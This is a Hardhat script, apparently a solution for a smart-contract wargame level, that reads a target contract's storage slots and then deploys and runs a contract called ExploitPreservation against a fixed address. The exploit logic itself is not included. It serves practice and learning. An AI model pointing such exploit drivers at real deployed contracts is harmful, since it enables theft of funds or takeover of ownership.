import { ethers } from 'hardhat'
import { ExploitPreservation } from '../types/typechain/ExploitPreservation'

async function main() {
  const targetAddr = '0x5500DB9d0Cd1d768E877C809807c830Ad01Dc694'

  const factory = await ethers.getContractFactory('ExploitPreservation')
  const exploit = (await factory.deploy(targetAddr)) as ExploitPreservation

  for (let i = 0; i < 5; i++) {
    console.log(
      i,
      ' ',
      await ethers.provider.getStorageAt(targetAddr, i)
      // labels[i]
    )
  }
  console.log('\n')

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)
  console.log('Contract deployed, executing exploit...')
  await exploit.execute()
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
